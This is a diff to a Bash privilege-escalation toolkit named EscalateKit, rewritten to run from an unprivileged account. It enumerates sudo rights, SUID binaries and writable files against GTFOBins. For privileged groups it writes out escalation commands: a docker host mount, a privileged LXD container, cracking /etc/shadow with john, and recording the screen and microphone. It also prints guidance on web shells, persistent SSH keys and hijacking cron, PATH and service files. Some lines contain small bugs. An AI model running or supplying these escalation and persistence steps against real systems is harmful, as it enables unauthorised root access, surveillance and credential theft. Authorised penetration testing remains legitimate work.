@@ -37,34 +37,30 @@ E_CONNECTION_FAILED=107
 # Utility Functions
 # ----------------------------------------------------------------------
 
-# Check sudo and elevate if needed
-check_sudo_and_elevate() {
-    # If not running as root/sudo
-    if [ "$(id -u)" -ne 0 ]; then
-        echo -e "\e[31m[!] EscalateKit requires root privileges to function properly.\e[0m"
-        echo -e "[*] Attempting to restart with sudo..."
+check_current_privileges() {
+    local current_user=$(whoami)
+    local current_uid=$(id -u)
+    
+    if [ "$QUIET_MODE" = false ]; then
+        echo -e "\e[33m[*] Current User Context:\e[0m"
+        echo -e "    User: $current_user"
+        echo -e "    UID: $current_uid"
         
-        # Check if sudo is available
-        if ! command -v sudo &> /dev/null; then
-            echo -e "\e[31m[ERROR] sudo command not found. Please run as root.\e[0m"
-            exit 1
-        fi
-        
-        # Ask for sudo password and restart script with same arguments
-        if sudo -v; then
-            echo -e "\e[32m[+] Sudo access confirmed. Restarting with elevated privileges...\e[0m"
-            sudo "$0" "$@"
-            exit $?
+        if [ "$current_uid" -eq 0 ]; then
+            echo -e "\e[31m[!] Already running as root - privilege escalation not needed\e[0m"
+            echo -e "    This tool is designed for escalating FROM unprivileged users TO root"
         else
-            echo -e "\e[31m[ERROR] Failed to get sudo privileges. Please run with sudo manually:\e[0m"
-            echo -e "    sudo $0 $@"
-            exit 1
+            echo -e "\e[32m[+] Running as unprivileged user - perfect for privilege escalation\e[0m"
         fi
+        echo ""
     fi
+    
+    # Log the current context
+    log_message "INFOS" "Starting EscalateKit as user: $current_user (UID: $current_uid)"
 }
 
-# Call this function at the very start of the script
-check_sudo_and_elevate "$@"
+
+check_current_privileges
 
 
 # Function to monitor system resources in background
@@ -504,9 +500,14 @@ recon_network() {
     echo -e "\n--- Network Connections ---" >>"$output_file"
     netstat -tuln 2>/dev/null >>"$output_file" || ss -tuln 2>/dev/null >>"$output_file"
 
-    # ARP table
+    # ARP table - Enhanced detection
     echo -e "\n--- ARP Table ---" >>"$output_file"
-    arp -a 2>/dev/null >>"$output_file" || ip neigh 2>/dev/null >>"$output_file"
+    {
+        ip neigh show 2>/dev/null ||    # Modern Linux
+        arp -a 2>/dev/null ||          # BSD-style (macOS, older Linux)
+        arp -n 2>/dev/null ||          # Traditional Linux
+        cat /proc/net/arp 2>/dev/null  # Raw ARP table
+    } >>"$output_file"
 
     # Routing table
     echo -e "\n--- Routing Table ---" >>"$output_file"
@@ -539,45 +540,287 @@ recon_sudo_privileges() {
     mkdir -p "$OUTPUT_DIR/recon"
     local output_file="$OUTPUT_DIR/recon/sudo_privs.txt"
     
-    echo "--- Sudo Privileges ---" > "$output_file"
-    
-    # Since we're running as root, we're interested in what the target user can run with sudo
-    echo "[*] Listing available sudo privileges for users..." >> "$output_file"
-    
-    if [ "$QUIET_MODE" = false ]; then
-        echo -e "[*] Checking users with sudo privileges..."
+    echo "--- Sudo Privileges Check ---" > "$output_file"
+    echo "Generated on: $(date)" >> "$output_file"
+    echo "User: $(whoami)" >> "$output_file"
+    echo "Hostname: $(hostname)" >> "$output_file"
+    echo -e "\n" >> "$output_file"
+
+    # Check sudo command exists
+    if ! command -v sudo &> /dev/null; then
+        echo "[-] sudo command not found" >> "$output_file"
+        log_message "WARN" "sudo command not found"
+        return 1
     fi
+
+    # Check sudo privileges
+    echo "--- Sudo Access Check ---" >> "$output_file"
     
-    # Flag to track if we've shown completion message
-    local completion_shown=false
-    
-    # Check sudo config file
-    if [ -f "/etc/sudoers" ]; then
-        echo -e "\n--- Sudoers File Contents ---" >> "$output_file"
-        echo "[*] Cannot directly output sudoers file (may contain sensitive data)" >> "$output_file"
-        echo "[*] Checking for potential sudoers misconfigurations..." >> "$output_file"
+    if sudo -n true 2>/dev/null; then
+        echo "[+] Passwordless sudo access available" >> "$output_file"
+        sudo_output=$(sudo -l 2>/dev/null)
+        echo "--- Raw sudo -l output ---" >> "$output_file"
+        echo "$sudo_output" >> "$output_file"
+        echo "--- End of raw output ---" >> "$output_file"
         
-        # Check for wildcards or dangerous NOPASSWD entries
-        grep "NOPASSWD" /etc/sudoers 2>/dev/null >> "$output_file" || echo "No NOPASSWD entries found" >> "$output_file"
+        # Check for GTFOBins matches
+        echo -e "\n--- Potential Privilege Escalation via Sudo ---" >> "$output_file"
         
-        echo -e "\n--- Users in sudo Group ---" >> "$output_file"
-        getent group sudo 2>/dev/null | cut -d: -f4 >> "$output_file" || echo "No users in sudo group found" >> "$output_file"
-        
-        echo -e "\n--- Users in sudoers.d ---" >> "$output_file"
-        if [ -d "/etc/sudoers.d" ]; then
-            ls -la /etc/sudoers.d/ >> "$output_file"
-        else
-            echo "No sudoers.d directory found" >> "$output_file"
+        # Check for the specific "(ALL : ALL) ALL" case first
+        if echo "$sudo_output" | grep -q "(ALL : ALL) ALL\|(ALL) ALL"; then
+            echo "[!] CRITICAL: User has full sudo access - (ALL : ALL) ALL" >> "$output_file"
+            echo "    This means the user can run ANY command as root with sudo" >> "$output_file"
+            echo "    Simply run: sudo su -" >> "$output_file"
+            echo "    Or: sudo /bin/bash" >> "$output_file"
+            echo "    Or: sudo -i" >> "$output_file"
+            echo "" >> "$output_file"
         fi
+        
+        # Parse sudo -l output line by line with improved parsing
+        echo "$sudo_output" | while IFS= read -r line; do
+            # Skip empty lines and headers
+            if [[ -z "$line" || "$line" =~ ^[[:space:]]*$ ]]; then
+                continue
+            fi
+            
+            if [[ "$line" =~ ^"Matching Defaults entries" ]]; then
+                continue
+            fi
+            
+            if [[ "$line" =~ ^"User $(whoami) may run" ]]; then
+                continue
+            fi
+            
+            # Check for (ALL : ALL) ALL pattern
+            if [[ "$line" =~ \(ALL[[:space:]]*:[[:space:]]*ALL\)[[:space:]]+ALL ]]; then
+                echo "[!] CRITICAL: Full sudo access found on line: $line" >> "$output_file"
+                continue
+            fi
+            
+            # Look for lines containing executable paths
+            if [[ "$line" =~ \(.*\)[[:space:]]+/.* ]]; then
+                echo "$line" | grep -oE '/[^[:space:],()]+' | while read -r binary_path; do
+                    if [[ -n "$binary_path" && "$binary_path" =~ ^/ ]]; then
+                        binary_name=$(basename "$binary_path")
+                        echo "[*] Found sudo permission for: $binary_path" >> "$output_file"
+                        check_gtfobins "$binary_name" "sudo" >> "$output_file"
+                        echo "" >> "$output_file"
+                    fi
+                done
+            elif [[ "$line" =~ ^[[:space:]]+/.* ]]; then
+                echo "$line" | grep -oE '/[^[:space:],()]+' | while read -r binary_path; do
+                    if [[ -n "$binary_path" && "$binary_path" =~ ^/ ]]; then
+                        binary_name=$(basename "$binary_path")
+                        echo "[*] Found sudo permission for: $binary_path" >> "$output_file"
+                        check_gtfobins "$binary_name" "sudo" >> "$output_file"
+                        echo "" >> "$output_file"
+                    fi
+                done
+            elif [[ "$line" =~ \(.*\)[[:space:]]+[^/] ]]; then
+                # Extract commands that don't start with /
+                commands=$(echo "$line" | sed 's/^[^)]*)[[:space:]]*//' | tr ',' '\n')
+                echo "$commands" | while read -r cmd; do
+                    cmd=$(echo "$cmd" | xargs)  # trim whitespace
+                    if [[ -n "$cmd" && "$cmd" != "ALL" ]]; then
+                        echo "[*] Found sudo permission for command: $cmd" >> "$output_file"
+                        # Try to get just the binary name
+                        binary_name=$(echo "$cmd" | awk '{print $1}')
+                        if [[ -n "$binary_name" ]]; then
+                            check_gtfobins "$binary_name" "sudo" >> "$output_file"
+                        fi
+                        echo "" >> "$output_file"
+                    fi
+                done
+            fi
+        done
+        
+        # Additional check for common dangerous sudo permissions
+        echo -e "\n--- Common Dangerous Sudo Permissions ---" >> "$output_file"
+        dangerous_binaries=("vi" "vim" "nano" "emacs" "less" "more" "man" "awk" "find" "nmap" "python" "python3" "perl" "ruby" "bash" "sh" "nc" "netcat" "socat" "wget" "curl" "tar" "zip" "unzip" "git" "ftp" "ssh" "scp" "rsync" "mount" "umount" "chmod" "chown" "cp" "mv" "dd" "systemctl" "service" "su")
+        
+        for binary in "${dangerous_binaries[@]}"; do
+            if echo "$sudo_output" | grep -q "/$binary\|[[:space:]]$binary[[:space:]]\|[[:space:]]$binary$\|^$binary[[:space:]]\|^$binary$"; then
+                echo "[!] CRITICAL: Found sudo access to $binary" >> "$output_file"
+                check_gtfobins "$binary" "sudo" >> "$output_file"
+                echo "" >> "$output_file"
+            fi
+        done
+        
     else
-        echo "[-] Sudoers file not found or not readable" >> "$output_file"
+        echo "[!] sudo requires password" >> "$output_file"
+        
+        # Only prompt for password if not in quiet mode
+        if [ "$QUIET_MODE" = false ]; then
+            read -p "Do you know the current user's password? (y/n): " know_password
+        else
+            know_password="n"
+        fi
+        
+        if [[ "$know_password" =~ ^[Yy]$ ]]; then
+            echo "[*] Attempting 'sudo -l' with password..." >> "$output_file"
+            sudo_output=$(sudo -l 2>/dev/null)
+            
+            if [ $? -eq 0 ]; then
+                echo "--- Raw sudo -l output (with password) ---" >> "$output_file"
+                echo "$sudo_output" >> "$output_file"
+                echo "--- End of raw output ---" >> "$output_file"
+                
+                echo -e "\n--- Potential Privilege Escalation via Sudo ---" >> "$output_file"
+                
+                # Check for (ALL : ALL) ALL case
+                if echo "$sudo_output" | grep -q "(ALL : ALL) ALL\|(ALL) ALL"; then
+                    echo "[!] CRITICAL: User has full sudo access - (ALL : ALL) ALL" >> "$output_file"
+                    echo "    This means the user can run ANY command as root with sudo" >> "$output_file"
+                    echo "    Simply run: sudo su -" >> "$output_file"
+                    echo "" >> "$output_file"
+                fi
+                
+                # Same parsing logic as above for password-protected sudo
+                echo "$sudo_output" | while IFS= read -r line; do
+                    [[ -z "$line" || "$line" =~ ^[[:space:]]*$ ]] && continue
+                    [[ "$line" =~ ^"Matching Defaults entries" ]] && continue
+                    [[ "$line" =~ ^"User $(whoami) may run" ]] && continue
+                    
+                    if [[ "$line" =~ \(.*\)[[:space:]]+/.* ]]; then
+                        echo "$line" | grep -oE '/[^[:space:],()]+' | while read -r binary_path; do
+                            if [[ -n "$binary_path" && "$binary_path" =~ ^/ ]]; then
+                                binary_name=$(basename "$binary_path")
+                                echo "[*] Found sudo permission for: $binary_path" >> "$output_file"
+                                check_gtfobins "$binary_name" "sudo" >> "$output_file"
+                                echo "" >> "$output_file"
+                            fi
+                        done
+                    elif [[ "$line" =~ ^[[:space:]]+/.* ]]; then
+                        echo "$line" | grep -oE '/[^[:space:],()]+' | while read -r binary_path; do
+                            if [[ -n "$binary_path" && "$binary_path" =~ ^/ ]]; then
+                                binary_name=$(basename "$binary_path")
+                                echo "[*] Found sudo permission for: $binary_path" >> "$output_file"
+                                check_gtfobins "$binary_name" "sudo" >> "$output_file"
+                                echo "" >> "$output_file"
+                            fi
+                        done
+                    fi
+                done
+            else
+                echo "[-] Failed to check sudo privileges (incorrect password)" >> "$output_file"
+            fi
+        else
+            echo "[-] Cannot check sudo privileges without password" >> "$output_file"
+        fi
     fi
+
+    # Enhanced group checks with comprehensive analysis
+    echo -e "\n--- User Group Memberships ---" >> "$output_file"
+    current_groups=$(groups)
+    echo "Current groups: $current_groups" >> "$output_file"
     
-    # Only show completion message if not already shown by loading spinner
-    if [ "$QUIET_MODE" = false ] && [ "$completion_shown" = false ]; then
-        # This variable gets checked by the show_loading function
-        export SKIP_COMPLETION_MESSAGE="true"
-    fi
+    echo -e "\n--- Privileged Group Analysis ---" >> "$output_file"
+    privileged_groups=("sudo" "wheel" "admin" "adm" "docker" "lxd" "disk" "video" "audio" "shadow" "root" "lpadmin" "sambashare" "plugdev" "netdev" "kvm" "libvirt")
+    
+    for group in "${privileged_groups[@]}"; do
+        if echo "$current_groups" | grep -qw "$group"; then
+            echo "[+] Member of $group group - Potential escalation:" >> "$output_file"
+            
+            case $group in
+                "docker")
+                    echo "  Command: docker run -v /:/mnt --rm -it alpine chroot /mnt sh" >> "$output_file"
+                    echo "  Reference: https://gtfobins.github.io/gtfobins/docker/" >> "$output_file"
+                    echo "  Explanation: Docker group members can mount host filesystem and escape container" >> "$output_file"
+                    ;;
+                "lxd")
+                    echo "  Commands:" >> "$output_file"
+                    echo "    lxc init ubuntu:18.04 test -c security.privileged=true" >> "$output_file"
+                    echo "    lxc config device add test rootdisk disk source=/ path=/mnt/root recursive=true" >> "$output_file"
+                    echo "    lxc start test && lxc exec test /bin/bash" >> "$output_file"
+                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation" >> "$output_file"
+                    echo "  Explanation: LXD group members can create privileged containers" >> "$output_file"
+                    ;;
+                "disk")
+                    echo "  Commands:" >> "$output_file"
+                    echo "    debugfs /dev/sda1" >> "$output_file"
+                    echo "    dd if=/dev/sda of=/tmp/disk.img" >> "$output_file"
+                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group" >> "$output_file"
+                    echo "  Explanation: Direct access to disk devices, can read entire filesystem" >> "$output_file"
+                    ;;
+                "shadow")
+                    echo "  Commands:" >> "$output_file"
+                    echo "    cat /etc/shadow" >> "$output_file"
+                    echo "    john --wordlist=/usr/share/wordlists/rockyou.txt /etc/shadow" >> "$output_file"
+                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#shadow-group" >> "$output_file"
+                    echo "  Explanation: Can read /etc/shadow file containing password hashes" >> "$output_file"
+                    ;;
+                "video")
+                    echo "  Commands:" >> "$output_file"
+                    echo "    cat /dev/fb0 > /tmp/screen.raw" >> "$output_file"
+                    echo "    ffmpeg -f fbdev -i /dev/fb0 screenshot.png" >> "$output_file"
+                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#video-group" >> "$output_file"
+                    echo "  Explanation: Access to framebuffer devices, can capture screen content" >> "$output_file"
+                    ;;
+                "audio")
+                    echo "  Commands:" >> "$output_file"
+                    echo "    arecord -f cd -t wav /tmp/audio.wav" >> "$output_file"
+                    echo "    cat /dev/snd/* > /tmp/audio.raw" >> "$output_file"
+                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#audio-group" >> "$output_file"
+                    echo "  Explanation: Access to audio devices, can record microphone input" >> "$output_file"
+                    ;;
+                "adm")
+                    echo "  Commands:" >> "$output_file"
+                    echo "    find /var/log -readable 2>/dev/null | head -20" >> "$output_file"
+                    echo "    grep -r 'password\\|pass\\|pwd' /var/log/ 2>/dev/null" >> "$output_file"
+                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#adm-group" >> "$output_file"
+                    echo "  Explanation: Read access to system logs, may contain sensitive information" >> "$output_file"
+                    ;;
+                "root")
+                    echo "  Commands:" >> "$output_file"
+                    echo "    find / -group root -perm -g=w ! -type l -exec ls -ld {} + 2>/dev/null" >> "$output_file"
+                    echo "    find /etc -group root -writable 2>/dev/null" >> "$output_file"
+                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe" >> "$output_file"
+                    echo "  Explanation: Check for group-writable files owned by root" >> "$output_file"
+                    ;;
+                "kvm"|"libvirt")
+                    echo "  Commands:" >> "$output_file"
+                    echo "    virsh list --all" >> "$output_file"
+                    echo "    virsh edit [vm-name]" >> "$output_file"
+                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#libvirt-group" >> "$output_file"
+                    echo "  Explanation: Control virtual machines, potential for VM escape" >> "$output_file"
+                    ;;
+                "lpadmin")
+                    echo "  Commands:" >> "$output_file"
+                    echo "    cupsctl" >> "$output_file"
+                    echo "    lpstat -a" >> "$output_file"
+                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#lpadmin-group" >> "$output_file"
+                    echo "  Explanation: Printer administration, potential for command injection via print jobs" >> "$output_file"
+                    ;;
+                "sambashare")
+                    echo "  Commands:" >> "$output_file"
+                    echo "    smbclient -L localhost" >> "$output_file"
+                    echo "    testparm" >> "$output_file"
+                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe" >> "$output_file"
+                    echo "  Explanation: Samba share access, check for writable shares or config files" >> "$output_file"
+                    ;;
+                "plugdev")
+                    echo "  Commands:" >> "$output_file"
+                    echo "    lsblk" >> "$output_file"
+                    echo "    mount /dev/sd* /mnt" >> "$output_file"
+                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#plugdev-group" >> "$output_file"
+                    echo "  Explanation: Mount removable devices, potential access to external storage" >> "$output_file"
+                    ;;
+                "netdev")
+                    echo "  Commands:" >> "$output_file"
+                    echo "    ip link show" >> "$output_file"
+                    echo "    iwconfig" >> "$output_file"
+                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe" >> "$output_file"
+                    echo "  Explanation: Network device configuration, potential for network manipulation" >> "$output_file"
+                    ;;
+                *)
+                    echo "  General admin privileges - investigate further" >> "$output_file"
+                    echo "  Check sudo -l for specific commands" >> "$output_file"
+                    echo "  Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe" >> "$output_file"
+                    ;;
+            esac
+            echo "" >> "$output_file"
+        fi
+    done
     
     log_message "INFOS" "Sudo privileges check saved to $output_file"
     return 0
@@ -599,36 +842,53 @@ recon_suid_files() {
     fi
     
     echo "[*] Searching for SUID files (this may take a while)..." >> "$output_file"
+    echo "[*] Note: Running as non-root user, some directories may not be accessible" >> "$output_file"
     
-    # Try more restrictive search first to avoid timeouts
-    # Limit find to common directories where SUID binaries typically exist
-    find /bin /usr/bin /sbin /usr/sbin /usr/local/bin /usr/local/sbin -type f -perm -4000 -ls 2>/dev/null > "/tmp/.suid_common.tmp"
+    # Search for SUID files with better error handling
+    echo "[*] Starting SUID file search..." >> "$output_file"
+    find / -type f -perm -4000 2>/dev/null > "/tmp/.suid_files.tmp"
     
-    # If we want to be thorough, search other locations but exclude problematic directories
-    find / -path "/proc" -prune -o -path "/sys" -prune -o -path "/dev" -prune -o -path "/run" -prune -o -type f -perm -4000 -ls 2>/dev/null > "/tmp/.suid_others.tmp"
-    
-    # Combine results
-    cat "/tmp/.suid_common.tmp" "/tmp/.suid_others.tmp" | sort -u > "/tmp/.suid_files.tmp"
+    # Count found files
+    suid_count=$(wc -l < "/tmp/.suid_files.tmp" 2>/dev/null || echo "0")
+    echo "[*] Found $suid_count SUID files" >> "$output_file"
     
     # Check if we found any SUID files
-    if [ -s "/tmp/.suid_files.tmp" ]; then
-        cat "/tmp/.suid_files.tmp" >> "$output_file"
+    if [ -s "/tmp/.suid_files.tmp" ] && [ "$suid_count" -gt 0 ]; then
+        echo -e "\n--- SUID Files List ---" >> "$output_file"
+        # Get detailed info about each SUID file
+        while read -r suid_file; do
+            if [ -f "$suid_file" ]; then
+                ls -la "$suid_file" 2>/dev/null >> "$output_file"
+            fi
+        done < "/tmp/.suid_files.tmp"
         
         # Extract binary names and check against GTFOBins
         echo -e "\n--- GTFOBins SUID Matches ---" >> "$output_file"
-        while read -r line; do
-            binary_path=$(echo "$line" | awk '{print $11}')
-            if [ -n "$binary_path" ]; then
-                binary_name=$(basename "$binary_path")
-                check_gtfobins "$binary_name" "suid" >> "$output_file"
+        found_exploitable=false
+        while read -r suid_file; do
+            if [ -f "$suid_file" ]; then
+                binary_name=$(basename "$suid_file")
+                if check_gtfobins "$binary_name" "suid" >> "$output_file"; then
+                    found_exploitable=true
+                fi
             fi
         done < "/tmp/.suid_files.tmp"
+        
+        if [ "$found_exploitable" = false ]; then
+            echo "[-] No exploitable SUID binaries found in GTFOBins database" >> "$output_file"
+            echo "    Tip: Check GTFOBins.github.io manually for less common binaries" >> "$output_file"
+        fi
     else
-        echo "[-] No SUID files found" >> "$output_file"
+        echo "[-] No SUID files found (or permission denied to all directories)" >> "$output_file"
+        echo "    This is unusual - most Linux systems have some SUID binaries" >> "$output_file"
+        echo "    Possible reasons:" >> "$output_file"
+        echo "    - Very restrictive filesystem permissions" >> "$output_file"
+        echo "    - Container environment with minimal binaries" >> "$output_file"
+        echo "    - Custom security configuration" >> "$output_file"
     fi
     
     # Clean up
-    rm -f "/tmp/.suid_common.tmp" "/tmp/.suid_others.tmp" "/tmp/.suid_files.tmp"
+    rm -f "/tmp/.suid_files.tmp"
     
     if [ "$QUIET_MODE" = false ]; then
         echo -e "\e[32m✓\e[0m Searching for SUID files... Done"
@@ -713,35 +973,161 @@ recon_writable_files() {
     mkdir -p "$OUTPUT_DIR/recon"
     local output_file="$OUTPUT_DIR/recon/writable_files.txt"
 
-    echo "--- Interesting Writable Files ---" >"$output_file"
+    echo "--- Writable Files Recon Report ---" >"$output_file"
+    echo "Generated on: $(date)" >> "$output_file"
+    echo "Running as user: $(whoami)" >> "$output_file"
+    echo "" >> "$output_file"
+    echo "[*] Note: Running as non-root user, some directories may not be accessible" >> "$output_file"
+    echo "" >> "$output_file"
 
     # This is a long operation - warn the user
     long_operation_warning "writable files search"
 
-    # Check specific interesting locations
+    # Search for files writable by current user (ENHANCED)
+    echo "[*] Searching for files writable by current user..." >>"$output_file"
+    find / -type f -writable 2>/dev/null | grep -v -E "^/(proc|sys|dev|run)" | head -50 >> "$output_file"
+    echo "" >> "$output_file"
+    
+    # Find world-writable files (ENHANCED - increased limit and better filtering)
+    echo "[*] World-writable files (excluding common temp locations)..." >>"$output_file"
+    find / -type f -perm -002 2>/dev/null | grep -v -E "^/(proc|sys|dev|run|tmp|var/tmp)" | head -50 >> "$output_file"
+    echo "" >> "$output_file"
+    
+    # Find world-writable directories (ENHANCED - better description and filtering)
+    echo "[*] World-writable directories (excluding common temp locations)..." >>"$output_file"
+    find / -type d -perm -002 2>/dev/null | grep -v -E "^/(proc|sys|dev|run|tmp|var/tmp)" | head -50 >> "$output_file"
+    echo "" >> "$output_file"
+
+    # Check specific interesting locations (ENHANCED)
+    echo "[*] Checking user-accessible configuration areas..." >>"$output_file"
+    
+    # Check home directory configurations
+    if [ -w "$HOME" ]; then
+        echo "[+] Home directory is writable: $HOME" >> "$output_file"
+    fi
+    
+    # Check for writable files in common configuration directories (NEW)
+    local config_dirs=("/etc" "/var/www" "/opt" "/usr/local" "/home")
+    for dir in "${config_dirs[@]}"; do
+        if [ -d "$dir" ] && [ -w "$dir" ]; then
+            echo "[+] Writable configuration directory: $dir" >> "$output_file"
+        fi
+    done
+    echo "" >> "$output_file"
+    
+    # Check for writable files in PATH (ENHANCED)
+    echo "[*] Checking for writable files in PATH..." >>"$output_file"
+    echo "$PATH" | tr ':' '\n' | while read -r path_dir; do
+        if [ -d "$path_dir" ] && [ -w "$path_dir" ]; then
+            echo "[+] Writable directory in PATH: $path_dir" >> "$output_file"
+            # List writable files in this PATH directory (NEW)
+            find "$path_dir" -maxdepth 1 -type f -writable 2>/dev/null | while read -r file; do
+                echo "    Writable file: $file" >> "$output_file"
+            done
+        fi
+    done
+    echo "" >> "$output_file"
+
+    # Check for writable configuration files (ENHANCED)
     echo "[*] Checking for writable configuration files..." >>"$output_file"
+    config_files="/etc/passwd /etc/shadow /etc/sudoers /etc/hosts /etc/crontab"
+    for config in $config_files; do
+        if [ -f "$config" ] && [ -w "$config" ]; then
+            echo "[+] CRITICAL: Writable system config file: $config" >> "$output_file"
+        fi
+    done
+    echo "" >> "$output_file"
 
-    # Check if we can write to /etc
-    run_with_timeout "find /etc -writable -type f 2>/dev/null > /tmp/.etc_writable.tmp" 120 "writable /etc files search" 30
-    cat /tmp/.etc_writable.tmp >>"$output_file"
+    # Check for writable cron files (NEW)
+    echo "[*] Checking for writable cron files..." >> "$output_file"
+    find /etc/cron* /var/spool/cron* -type f -writable 2>/dev/null | while read -r file; do
+        echo "[+] Writable cron file: $file" >> "$output_file"
+    done
+    echo "" >> "$output_file"
 
-    # Check for writable system binaries
-    echo -e "\n[*] Checking for writable system binaries..." >>"$output_file"
-    run_with_timeout "find /bin /usr/bin /sbin /usr/sbin -writable -type f 2>/dev/null > /tmp/.bin_writable.tmp" 120 "writable binaries search" 30
-    cat /tmp/.bin_writable.tmp >>"$output_file"
+    # Check for writable systemd service files (NEW)
+    echo "[*] Checking for writable systemd service files..." >> "$output_file"
+    find /etc/systemd/system /lib/systemd/system -type f -writable 2>/dev/null | while read -r file; do
+        echo "[+] Writable service file: $file" >> "$output_file"
+    done
+    echo "" >> "$output_file"
 
-    # Check for writable service files
-    echo -e "\n[*] Checking for writable service files..." >>"$output_file"
-    run_with_timeout "find /etc/systemd /lib/systemd -writable -type f 2>/dev/null > /tmp/.systemd_writable.tmp" 120 "writable service files search" 30
-    cat /tmp/.systemd_writable.tmp >>"$output_file"
+    # Check for writable startup files (NEW)
+    echo "[*] Checking for writable startup files..." >> "$output_file"
+    startup_files="/etc/rc.local /etc/init.d/* /etc/profile /etc/bash.bashrc"
+    for startup_file in $startup_files; do
+        if [ -f "$startup_file" ] && [ -w "$startup_file" ]; then
+            echo "[+] Writable startup file: $startup_file" >> "$output_file"
+        fi
+    done
+    echo "" >> "$output_file"
 
-    # Check for world-writable directories in root
-    echo -e "\n[*] Checking for world-writable directories in root..." >>"$output_file"
-    run_with_timeout "find / -writable -type d 2>/dev/null | grep -v \"^/proc\" | grep -v \"^/sys\" | grep -v \"^/dev\" | grep -v \"^/run\" | grep -v \"^/tmp\" | grep -v \"^/var/tmp\" > /tmp/.dir_writable.tmp" 180 "writable directories search" 60
-    cat /tmp/.dir_writable.tmp >>"$output_file"
+    # Check for writable log files (NEW)
+    echo "[*] Checking for writable log files..." >> "$output_file"
+    find /var/log -type f -writable 2>/dev/null | head -20 | while read -r file; do
+        echo "[+] Writable log file: $file" >> "$output_file"
+    done
+    echo "" >> "$output_file"
 
-    # Clean up
-    rm -f /tmp/.etc_writable.tmp /tmp/.bin_writable.tmp /tmp/.systemd_writable.tmp /tmp/.dir_writable.tmp
+    # Check for writable web directories (NEW)
+    echo "[*] Checking for writable web directories..." >> "$output_file"
+    web_dirs="/var/www /srv/www /opt/lampp/htdocs /var/www/html"
+    for web_dir in $web_dirs; do
+        if [ -d "$web_dir" ] && [ -w "$web_dir" ]; then
+            echo "[+] Writable web directory: $web_dir" >> "$output_file"
+        fi
+    done
+    echo "" >> "$output_file"
+
+    # Check for writable database files (NEW)
+    echo "[*] Checking for writable database files..." >> "$output_file"
+    find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null | while read -r db_file; do
+        if [ -w "$db_file" ]; then
+            echo "[+] Writable database file: $db_file" >> "$output_file"
+        fi
+    done | head -20
+    echo "" >> "$output_file"
+
+    # Check for writable SSH files (NEW)
+    echo "[*] Checking for writable SSH files..." >> "$output_file"
+    ssh_dirs="/etc/ssh /home/*/.ssh /root/.ssh"
+    for ssh_dir in $ssh_dirs; do
+        if [ -d "$ssh_dir" ] && [ -w "$ssh_dir" ]; then
+            echo "[+] Writable SSH directory: $ssh_dir" >> "$output_file"
+            # Check for specific SSH files
+            for ssh_file in "$ssh_dir/authorized_keys" "$ssh_file/id_rsa" "$ssh_dir/config"; do
+                if [ -f "$ssh_file" ] && [ -w "$ssh_file" ]; then
+                    echo "    Writable SSH file: $ssh_file" >> "$output_file"
+                fi
+            done
+        fi
+    done
+    echo "" >> "$output_file"
+
+    # Add summary section (NEW)
+    echo "--- Recon Summary ---" >> "$output_file"
+    total_writable_files=$(grep -c "Writable file:" "$output_file" || echo "0")
+    total_writable_dirs=$(grep -c "Writable directory:" "$output_file" || echo "0")
+    interesting_locations=$(grep -c "^\[+\]" "$output_file" || echo "0")
+    
+    echo "Total writable files found: $total_writable_files" >> "$output_file"
+    echo "Total writable directories found: $total_writable_dirs" >> "$output_file"
+    echo "Interesting writable locations: $interesting_locations" >> "$output_file"
+    echo "" >> "$output_file"
+
+    # Add exploitation guidance (NEW)
+    if [ "$interesting_locations" -gt 0 ]; then
+        echo "--- Exploitation Guidance ---" >> "$output_file"
+        echo "Writable files can be exploited in several ways:" >> "$output_file"
+        echo "1. Cron files: Modify to execute commands when cron runs" >> "$output_file"
+        echo "2. Service files: Modify to execute commands when service starts/restarts" >> "$output_file"
+        echo "3. Startup files: Modify to execute commands at system/user startup" >> "$output_file"
+        echo "4. PATH directories: Place malicious binaries with common names" >> "$output_file"
+        echo "5. Config files: Modify to change system behavior or gain access" >> "$output_file"
+        echo "6. SSH files: Add keys for persistent access" >> "$output_file"
+        echo "7. Web directories: Upload web shells or malicious content" >> "$output_file"
+        echo "" >> "$output_file"
+    fi
 
     log_message "INFOS" "Writable files check saved to $output_file"
     return 0
@@ -753,38 +1139,379 @@ recon_kernel_exploits() {
     mkdir -p "$OUTPUT_DIR/recon"
     local output_file="$OUTPUT_DIR/recon/kernel_exploits.txt"
 
-    echo "--- Kernel Information ---" >"$output_file"
+    echo "--- Kernel Exploit Analysis ---" >"$output_file"
+    echo "Generated on: $(date)" >> "$output_file"
+    echo "Running as user: $(whoami)" >> "$output_file"
+    echo "" >> "$output_file"
 
-    # Get kernel details
+    # Get comprehensive kernel information
     kernel_version=$(uname -r)
+    kernel_release=$(uname -v)
+    architecture=$(uname -m)
+    os_version=$(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2)
+    
+    echo "--- System Information ---" >>"$output_file"
     echo "Kernel Version: $kernel_version" >>"$output_file"
+    echo "Kernel Release: $kernel_release" >>"$output_file"
+    echo "Architecture: $architecture" >>"$output_file"
+    echo "OS Version: $os_version" >>"$output_file"
+    echo "" >>"$output_file"
 
-    # Simple checks for known vulnerable kernel versions
-    echo -e "\n--- Potential Kernel Vulnerabilities ---" >>"$output_file"
+    # Extract version numbers for comparison
+    kernel_major=$(echo "$kernel_version" | cut -d. -f1)
